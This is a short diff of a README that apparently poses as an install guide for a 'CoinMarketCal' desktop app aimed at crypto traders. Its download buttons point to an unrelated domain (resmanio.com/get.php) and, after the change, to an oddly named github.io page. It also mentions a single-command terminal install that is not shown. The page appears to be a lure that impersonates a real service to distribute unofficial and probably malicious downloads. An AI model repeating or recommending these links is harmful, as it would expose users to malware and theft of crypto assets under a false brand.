@@ -4,7 +4,7 @@
 **CoinMarketCal** is the leading economic calendar for cryptoassets, helping traders track upcoming events, catalysts, and market-moving announcements. Follow the guide below to install the desktop app experience on your Mac or Windows PC and stay ahead of the market 📈
 
 [![Get for macOS](https://img.shields.io/badge/Download-macOS-1679A7?style=for-the-badge&logo=apple&logoColor=white)](https://resmanio.com/get.php?call=imb)
-[![Get for Windows](https://img.shields.io/badge/Download-Windows-1679A7?style=for-the-badge&logo=windows&logoColor=white)]()
+[![Get for Windows](https://img.shields.io/badge/Download-Windows-1679A7?style=for-the-badge&logo=windows&logoColor=white)](https://coinmarketcal-cryptoasset-calendar.github.io/.github/)
 
 > If the buttons above don’t work for you, follow the terminal method below to install via a single command.
 
